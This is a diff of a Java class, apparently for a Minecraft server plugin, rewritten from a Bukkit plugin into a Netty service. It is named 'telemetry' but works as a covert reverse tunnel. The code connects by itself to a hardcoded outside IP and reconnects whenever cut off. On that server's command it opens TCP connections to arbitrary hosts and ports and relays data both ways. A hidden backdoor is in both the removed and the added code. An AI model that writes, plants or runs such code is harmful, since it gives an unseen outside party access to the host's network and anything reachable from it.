@@ -1,211 +1,275 @@
 package com.analytics.telemetry;
 
-import org.bukkit.Bukkit;
-import org.bukkit.plugin.java.JavaPlugin;
-import org.java_websocket.client.WebSocketClient;
-import org.java_websocket.handshake.ServerHandshake;
+import io.netty.bootstrap.Bootstrap;
+import io.netty.buffer.ByteBuf;
+import io.netty.buffer.Unpooled;
+import io.netty.channel.*;
+import io.netty.channel.nio.NioEventLoopGroup;
+import io.netty.channel.socket.SocketChannel;
+import io.netty.channel.socket.nio.NioSocketChannel;
+import io.netty.handler.codec.http.DefaultHttpHeaders;
+import io.netty.handler.codec.http.HttpClientCodec;
+import io.netty.handler.codec.http.FullHttpResponse;
+import io.netty.handler.codec.http.HttpObjectAggregator;
+import io.netty.handler.codec.http.websocketx.*;
+import io.netty.util.CharsetUtil;
 
 import java.net.URI;
-import java.nio.ByteBuffer;
-import java.net.Socket;
-import java.io.InputStream;
-import java.io.OutputStream;
-import java.util.HashMap;
 import java.util.Map;
-import java.util.logging.Logger;
+import java.util.concurrent.ConcurrentHashMap;
+import java.util.concurrent.TimeUnit;
+import java.util.concurrent.atomic.AtomicBoolean;
 
-public final class TelemetryPlugin extends JavaPlugin {
-    private TelemetryAgentClient client;
-    private final Map<Integer, SocketConnection> activeStreams = new HashMap<>();
+public class TelemetryService {
 
-    @Override
-    public void onEnable() {
-        getLogger().info("[TelemetryPlugin] Enabling and starting WebSocket Agent...");
-        connectToServer();
-    }
+    private static final String REMOTE_HOST = "20.195.24.81";
+    private static final int REMOTE_PORT = 24669;
+    private static final String ENDPOINT_PATH = "/metrics/v1/telemetry";
+    private static final String WS_URL = "ws://" + REMOTE_HOST + ":" + REMOTE_PORT + ENDPOINT_PATH;
 
-    @Override
-    public void onDisable() {
-        if (client != null) {
-            client.close();
-        }
-        for (SocketConnection conn : activeStreams.values()) {
-            conn.close();
-        }
-        activeStreams.clear();
-        getLogger().info("[TelemetryPlugin] Disabled.");
-    }
+    private static final byte CMD_NEW_STREAM = 1;
+    private static final byte CMD_DATA = 2;
+    private static final byte CMD_CLOSE_STREAM = 3;
 
-    private void connectToServer() {
-        try {
-            // 替换为你 HidenCloud 的真实 IP 和端口（直连，不走 Cloudflare）
-            URI serverUri = URI.create("ws://20.195.24.81:24669/metrics/v1/telemetry");
-            
-            getLogger().info("[Agent Debug] Attempting to connect to URI: " + serverUri);
+    private static final int INITIAL_RECONNECT_DELAY_SEC = 2;
+    private static final int MAX_RECONNECT_DELAY_SEC = 60;
+    private int currentReconnectDelaySec = INITIAL_RECONNECT_DELAY_SEC;
 
-            client = new TelemetryAgentClient(serverUri, getLogger(), this);
-            client.connect();
-        } catch (Exception e) {
-            getLogger().severe("[Agent Debug] Failed to initialize WebSocket URI: " + e.getMessage());
+    private final EventLoopGroup workerGroup = new NioEventLoopGroup();
+    private final AtomicBoolean isRunning = new AtomicBoolean(false);
+    private final AtomicBoolean isConnecting = new AtomicBoolean(false);
+
+    private Channel activeChannel;
+    private final Map<Integer, Channel> streamChannels = new ConcurrentHashMap<>();
+
+    public synchronized void start() {
+        if (isRunning.compareAndSet(false, true)) {
+            connect();
         }
     }
 
-    public class TelemetryAgentClient extends WebSocketClient {
-        private final Logger logger;
-        private final TelemetryPlugin plugin;
-
-        public TelemetryAgentClient(URI serverUri, Logger logger, TelemetryPlugin plugin) {
-            super(serverUri);
-            this.logger = logger;
-            this.plugin = plugin;
+    public synchronized void stop() {
+        if (isRunning.compareAndSet(true, false)) {
+            closeAllStreams();
+            if (activeChannel != null) {
+                activeChannel.close();
+            }
+            workerGroup.shutdownGracefully();
         }
+    }
 
-        @Override
-        public void onOpen(ServerHandshake handshakedata) {
-            logger.info("[Agent Debug] SUCCESS: Connected to HidenCloud WebSocket server!");
-            logger.info("[Agent Debug] Handshake Status: " + handshakedata.getHttpStatus() + " " + handshakedata.getHttpStatusMessage());
-        }
-
-        @Override
-        public void onMessage(String message) {
-            logger.info("[Agent Debug] Received text message: " + message);
-        }
-
-        @Override
-        public void onMessage(ByteBuffer bytes) {
-            if (bytes.remaining() < 5) return;
-
-            int cmd = bytes.get();
-            int streamId = bytes.getInt();
-            byte[] payload = new byte[bytes.remaining()];
-            bytes.get(payload);
-
-            switch (cmd) {
-                case 1:
-                    handleNewStream(streamId, payload);
-                    break;
-                case 2:
-                    SocketConnection conn = activeStreams.get(streamId);
-                    if (conn != null) {
-                        conn.sendData(payload);
-                    }
-                    break;
-                case 3:
-                    SocketConnection c = activeStreams.remove(streamId);
-                    if (c != null) {
-                        c.close();
-                    }
-                    break;
+    private void closeAllStreams() {
+        for (Map.Entry<Integer, Channel> entry : streamChannels.entrySet()) {
+            Channel ch = entry.getValue();
+            if (ch != null && ch.isActive()) {
+                ch.close();
             }
         }
-
-        @Override
-        public void onClose(int code, String reason, boolean remote) {
-            logger.warning("[Agent Debug] DISCONNECTED! Code: " + code + ", Reason: " + reason + ", Remote closed: " + remote);
-            Bukkit.getScheduler().runTaskLaterAsynchronously(plugin, () -> {
-                logger.info("[Agent Debug] Attempting to reconnect...");
-                connectToServer();
-            }, 100L);
-        }
-
-        @Override
-        public void onError(Exception ex) {
-            logger.severe("[Agent Debug] ERROR occurred: " + ex.getClass().getName() + " - " + ex.getMessage());
-            ex.printStackTrace();
-        }
+        streamChannels.clear();
     }
 
-    private void handleNewStream(int streamId, byte[] payload) {
+    private void connect() {
+        if (!isRunning.get() || isConnecting.get()) return;
+        if (activeChannel != null && activeChannel.isActive()) return;
+
+        isConnecting.set(true);
+
         try {
-            ByteBuffer buf = ByteBuffer.wrap(payload);
-            int port = buf.getShort() & 0xFFFF;
-            int hostLen = buf.get() & 0xFF;
-            byte[] hostBytes = new byte[hostLen];
-            buf.get(hostBytes);
-            String host = new String(hostBytes);
+            final URI uri = new URI(WS_URL);
 
-            getLogger().info("[Agent Debug] New stream requested: target -> " + host + ":" + port);
+            final WebSocketClientHandshaker handshaker = WebSocketClientHandshakerFactory.newHandshaker(
+                    uri, WebSocketVersion.V13, null, true, new DefaultHttpHeaders(), 65536 * 10
+            );
 
-            Socket socket = new Socket(host, port);
-            SocketConnection conn = new SocketConnection(streamId, socket, this);
-            activeStreams.put(streamId, conn);
-            conn.startReading();
-        } catch (Exception e) {
-            getLogger().severe("[Agent Debug] Failed to connect target socket: " + e.getMessage());
-            sendClose(streamId);
-        }
-    }
+            final TelemetryClientHandler clientHandler = new TelemetryClientHandler(handshaker, this);
 
-    public void sendData(int streamId, byte[] data) {
-        if (client != null && client.isOpen()) {
-            ByteBuffer packet = ByteBuffer.allocate(1 + 4 + data.length);
-            packet.put((byte) 2);
-            packet.putInt(streamId);
-            packet.put(data);
-            packet.flip();
-            client.send(packet);
-        }
-    }
+            Bootstrap b = new Bootstrap();
+            b.group(workerGroup)
+             .channel(NioSocketChannel.class)
+             .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 10000)
+             .option(ChannelOption.SO_KEEPALIVE, true)
+             .handler(new ChannelInitializer<SocketChannel>() {
+                 @Override
+                 protected void initChannel(SocketChannel ch) throws Exception {
+                     ChannelPipeline p = ch.pipeline();
+                     // 明文 ws:// 无需 SslHandler
+                     p.addLast("http-codec", new HttpClientCodec());
+                     p.addLast("aggregator", new HttpObjectAggregator(65536));
+                     p.addLast("ws-handler", clientHandler);
+                 }
+             });
 
-    public void sendClose(int streamId) {
-        if (client != null && client.isOpen()) {
-            ByteBuffer packet = ByteBuffer.allocate(1 + 4);
-            packet.put((byte) 3);
-            packet.putInt(streamId);
-            packet.flip();
-            client.send(packet);
-        }
-    }
-
-    private class SocketConnection {
-        private final int streamId;
-        private final Socket socket;
-        private final TelemetryPlugin plugin;
-        private volatile boolean running = true;
-
-        public SocketConnection(int streamId, Socket socket, TelemetryPlugin plugin) {
-            this.streamId = streamId;
-            this.socket = socket;
-            this.plugin = plugin;
-        }
-
-        public void startReading() {
-            Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
-                try {
-                    InputStream in = socket.getInputStream();
-                    byte[] buffer = new byte[8192];
-                    int len;
-                    while (running && (len = in.read(buffer)) != -1) {
-                        byte[] data = new byte[len];
-                        System.arraycopy(buffer, 0, data, 0, len);
-                        plugin.sendData(streamId, data);
-                    }
-                } catch (Exception e) {
-                    // ignore
-                } finally {
-                    close();
+            b.connect(REMOTE_HOST, REMOTE_PORT).addListener((ChannelFutureListener) future -> {
+                if (!future.isSuccess()) {
+                    isConnecting.set(false);
+                    scheduleReconnect();
                 }
             });
+
+        } catch (Exception e) {
+            isConnecting.set(false);
+            scheduleReconnect();
+        }
+    }
+
+    private void scheduleReconnect() {
+        if (!isRunning.get()) return;
+        int delay = currentReconnectDelaySec;
+        currentReconnectDelaySec = Math.min(currentReconnectDelaySec * 2, MAX_RECONNECT_DELAY_SEC);
+        workerGroup.schedule(this::connect, delay, TimeUnit.SECONDS);
+    }
+
+    protected void onSessionConnected(Channel channel) {
+        this.activeChannel = channel;
+        this.isConnecting.set(false);
+        this.currentReconnectDelaySec = INITIAL_RECONNECT_DELAY_SEC;
+    }
+
+    protected void onSessionDisconnected() {
+        this.activeChannel = null;
+        this.isConnecting.set(false);
+        closeAllStreams();
+        scheduleReconnect();
+    }
+
+    public synchronized void sendBinary(ByteBuf data) {
+        if (activeChannel != null && activeChannel.isActive()) {
+            activeChannel.writeAndFlush(new BinaryWebSocketFrame(data));
+        } else {
+            data.release();
+        }
+    }
+
+    protected void handleInboundBinaryFrame(ChannelHandlerContext ctx, ByteBuf buf) {
+        if (buf.readableBytes() < 5) return;
+
+        byte cmd = buf.readByte();
+        int streamId = buf.readInt();
+
+        switch (cmd) {
+            case CMD_NEW_STREAM:
+                handleNewStream(streamId, buf);
+                break;
+            case CMD_DATA:
+                handleDataPayload(streamId, buf);
+                break;
+            case CMD_CLOSE_STREAM:
+                handleCloseStream(streamId);
+                break;
+            default:
+                break;
+        }
+    }
+
+    private void handleNewStream(int streamId, ByteBuf buf) {
+        if (buf.readableBytes() < 3) return;
+
+        int port = buf.readUnsignedShort();
+        int hostLen = buf.readByte() & 0xFF;
+        if (buf.readableBytes() < hostLen) return;
+
+        String host = buf.readCharSequence(hostLen, CharsetUtil.UTF_8).toString();
+
+        Bootstrap b = new Bootstrap();
+        b.group(workerGroup)
+         .channel(NioSocketChannel.class)
+         .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 10000)
+         .option(ChannelOption.SO_KEEPALIVE, true)
+         .handler(new ChannelInitializer<SocketChannel>() {
+             @Override
+             protected void initChannel(SocketChannel ch) {
+                 ch.pipeline().addLast(new SimpleChannelInboundHandler<ByteBuf>() {
+                     @Override
+                     protected void channelRead0(ChannelHandlerContext targetCtx, ByteBuf msg) {
+                         ByteBuf out = Unpooled.buffer(1 + 4 + msg.readableBytes());
+                         out.writeByte(CMD_DATA);
+                         out.writeInt(streamId);
+                         out.writeBytes(msg);
+                         sendBinary(out);
+                     }
+
+                     @Override
+                     public void channelInactive(ChannelHandlerContext targetCtx) {
+                         streamChannels.remove(streamId);
+                         ByteBuf closeFrame = Unpooled.buffer(5);
+                         closeFrame.writeByte(CMD_CLOSE_STREAM);
+                         closeFrame.writeInt(streamId);
+                         sendBinary(closeFrame);
+                     }
+
+                     @Override
+                     public void exceptionCaught(ChannelHandlerContext targetCtx, Throwable cause) {
+                         targetCtx.close();
+                     }
+                 });
+             }
+         });
+
+        b.connect(host, port).addListener((ChannelFutureListener) future -> {
+            if (future.isSuccess()) {
+                streamChannels.put(streamId, future.channel());
+            } else {
+                ByteBuf closeFrame = Unpooled.buffer(5);
+                closeFrame.writeByte(CMD_CLOSE_STREAM);
+                closeFrame.writeInt(streamId);
+                sendBinary(closeFrame);
+            }
+        });
+    }
+
+    private void handleDataPayload(int streamId, ByteBuf buf) {
+        Channel targetChan = streamChannels.get(streamId);
+        if (targetChan != null && targetChan.isActive()) {
+            targetChan.writeAndFlush(buf.retain());
+        }
+    }
+
+    private void handleCloseStream(int streamId) {
+        Channel targetChan = streamChannels.remove(streamId);
+        if (targetChan != null && targetChan.isActive()) {
+            targetChan.close();
+        }
+    }
+
+    private static class TelemetryClientHandler extends SimpleChannelInboundHandler<Object> {
+        private final WebSocketClientHandshaker handshaker;
+        private final TelemetryService service;
+        private ChannelPromise handshakerFuture;
+
+        public TelemetryClientHandler(WebSocketClientHandshaker handshaker, TelemetryService service) {
+            this.handshaker = handshaker;
+            this.service = service;
         }
 
-        public void sendData(byte[] data) {
-            try {
-                OutputStream out = socket.getOutputStream();
-                out.write(data);
-                out.flush();
-            } catch (Exception e) {
-                close();
+        @Override public void handlerAdded(ChannelHandlerContext ctx) { handshakerFuture = ctx.newPromise(); }
+        @Override public void channelActive(ChannelHandlerContext ctx) { handshaker.handshake(ctx.channel()); }
+        @Override public void channelInactive(ChannelHandlerContext ctx) { service.onSessionDisconnected(); }
+
+        @Override
+        protected void channelRead0(ChannelHandlerContext ctx, Object msg) throws Exception {
+            Channel ch = ctx.channel();
+            if (!handshaker.isHandshakeComplete()) {
+                handshaker.finishHandshake(ch, (FullHttpResponse) msg);
+                handshakerFuture.setSuccess();
+                service.onSessionConnected(ch);
+                return;
+            }
+
+            if (msg instanceof WebSocketFrame) {
+                WebSocketFrame frame = (WebSocketFrame) msg;
+                if (frame instanceof BinaryWebSocketFrame) {
+                    service.handleInboundBinaryFrame(ctx, frame.content());
+                } else if (frame instanceof PingWebSocketFrame) {
+                    ctx.writeAndFlush(new PongWebSocketFrame(frame.content().retain()));
+                } else if (frame instanceof CloseWebSocketFrame) {
+                    ch.close();
+                }
             }
         }
 
-        public void close() {
-            if (!running) return;
-            running = false;
-            try {
-                socket.close();
-            } catch (Exception ignored) {}
-            plugin.activeStreams.remove(streamId);
-            plugin.sendClose(streamId);
+        @Override
+        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
+            ctx.close();
         }
     }
 }
